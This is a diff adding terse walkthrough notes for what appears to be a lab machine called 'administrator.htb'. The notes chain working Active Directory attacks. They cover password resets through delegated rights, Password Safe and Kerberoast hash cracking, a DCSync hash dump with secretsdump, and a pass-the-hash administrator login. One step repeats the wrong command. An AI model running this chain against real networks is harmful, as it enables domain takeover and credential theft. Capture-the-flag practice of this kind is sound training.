@@ -1,0 +1,37 @@
+-- Until get emily user
+nmap and get information from the default olivia user:
+edit /etc/hosts: <target ip> administrator.htb
+nxc smb <target ip> -u olivia -p ichliebedich --users (also shares)
+nxc ftp <target ip> -u olivia -p ichliebedich
+nxc winrm <target ip> -u olivia -p ichliebedich
+
+run bloodhound to get AD information:
+bloodhound-ce-python -u olivia -p ichliebedich -d administrator.htb -c all -ns <target ip>
+sudo docker-compose up -d, log in, upload to http://localhost:8080
+
+olivia -> michael(GenericAll):
+sudo net rpc password michael <new password> -U 'administrator.htb/Olivia%ichliebedich' -S administrator.htb
+michael -> benjamin(ForceChangePassword):
+sudo net rpc password michael <new password> -U 'administrator.htb/Olivia%ichliebedich' -S administrator.htb
+
+benjamin(share moderator):
+ftp administrator.htb
+Insert user, password
+get Backup.psafe3
+
+Crack: hashcat -m 5200 Backup.psafe3 rockyou.txt
+sudo apt install passwordsafe
+pwsafe; select the file with cracked password -> save credentials in user and password
+nxc smb <target ip> -u user -p password --continue-on-success: only emily is valid
+evil-winrm -i <target ip> -u emily -p <emily-pass>
+
+emily -> ethan(GenericWrite):
+git clone https://github.com/ShutdownRepo/targetedKerberoast.git and install requirements
+./targetedKerberoast.py -v -d administrator.htb -u emily -p <emily-pass>: Get TGS to crack ethan password
+(May need sudo ntpdate administrator.htb)
+
+hashcat <TGS> rockyou.txt -> Get ethan's password
+
+ethan -> admin(DCSync on domain):
+secretsdump.py administrator.htb/ethan:<ethan-pass>@<target ip>: Get hash for every user -> copy ntlm hash of admin
+evil-winrm -i <target ip> -u administrator -H <admin-NTLMhash>
